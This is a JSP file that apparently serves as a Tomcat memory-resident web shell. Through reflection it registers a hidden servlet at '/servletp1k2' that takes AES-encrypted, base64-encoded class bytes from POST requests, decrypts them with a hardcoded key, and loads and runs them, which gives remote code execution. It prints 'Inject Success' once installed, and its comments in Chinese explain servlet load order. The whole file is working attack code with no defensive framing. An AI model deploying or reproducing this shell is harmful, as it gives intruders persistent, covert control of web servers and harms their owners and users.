<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext"%>
<%@ page import = "org.apache.catalina.core.StandardContext"%>
<%@ page import = "javax.servlet.*"%>
<%@ page import = "javax.servlet.http.HttpServletRequest"%>
<%@ page import = "javax.servlet.http.HttpServletResponse"%>
<%@ page import = "java.io.IOException"%>
<%@ page import = "java.lang.reflect.Field"%>
<%@ page import="org.apache.catalina.Wrapper" %>

<%
    class InsertServlet implements Servlet {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        @Override
        public void init(ServletConfig servletConfig) throws ServletException { }

        @Override
        public ServletConfig getServletConfig() {
            return null; }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            HttpServletResponse rsp = (HttpServletResponse) servletResponse;
            try {
                if (req.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";
                    req.getSession().setAttribute("u", k);
                    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                    c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                    java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                    pageContext.put("session", req.getSession());
                    pageContext.put("request", req);
                    pageContext.put("response", rsp);
                    java.io.BufferedReader bf = req.getReader();
                    byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                    String sb = new String(evilClassBytes);
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                    Object a = evilClass.newInstance();
                    a.equals(pageContext);
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public String getServletInfo() {
            return null; }
        @Override
        public void destroy() {
        }
    }
%>

<%
    ServletContext servletContext = request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    InsertServlet insertServlet  = new InsertServlet();

    Wrapper insertWrapper = standardContext.createWrapper();
    insertWrapper.setName("InsertServlet");
    insertWrapper.setLoadOnStartup(1);
    //当值为0或者大于0时 表示容器在应用启动时就加载这个servlet
    //当是一个负数时或者没有指定时 则指示容器在该servlet被选择时才加载
    //正数的值越小 启动该servlet的优先级越高
    insertWrapper.setServlet(insertServlet);
    insertWrapper.setServletClass(insertServlet.getClass().getName());
    standardContext.addChild(insertWrapper);
    standardContext.addServletMapping("/servletp1k2","InsertServlet");
    //standardContext.removeServletMapping("/servletp1k2","InsertServlet");

    out.println("Inject Success");

%>

